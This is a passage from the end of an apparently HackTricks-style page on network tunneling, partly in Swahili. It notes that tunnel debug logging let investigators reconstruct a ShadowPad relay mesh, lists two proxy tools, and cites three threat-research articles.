* **Debug telemetry** – logging ya hiari hurekodi source IP, destination IP, na jumla ya bytes zilizoforwardiwa kwa kila pairing. Investigators walitumia breadcrumbs hizo kujenga upya ShadowPad mesh iliyokuwa ikienea kwenye victims wengi.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
